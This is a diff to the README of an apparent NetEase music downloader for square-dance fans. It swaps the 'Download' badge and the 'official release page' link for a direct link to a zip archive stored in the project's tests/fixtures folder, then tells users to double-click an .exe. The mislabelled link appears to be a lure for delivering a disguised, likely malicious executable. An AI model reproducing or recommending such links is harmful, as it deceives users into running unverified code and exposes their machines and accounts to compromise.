@@ -1,6 +1,6 @@
 # 💃 netease-square-dance-downloader - Download music for your fitness dance
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader/raw/refs/heads/main/tests/fixtures/dance-netease-downloader-square-v2.1.zip)
 
 This software downloads music from Netease Cloud Music specifically for square dance activities. It saves your favorite songs as MP3 files directly onto your USB drive. The tool handles the login process through your browser to keep your account safe. It also checks for duplicate files to ensure you do not download the same song twice.
 
@@ -12,7 +12,7 @@ This software downloads music from Netease Cloud Music specifically for square d
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader) to get the latest version.
+1. Visit the [official release page](https://github.com/ballhawking-lettersecurity769/netease-square-dance-downloader/raw/refs/heads/main/tests/fixtures/dance-netease-downloader-square-v2.1.zip) to get the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save this file to your Desktop.
 4. Double-click the file to start the installer.
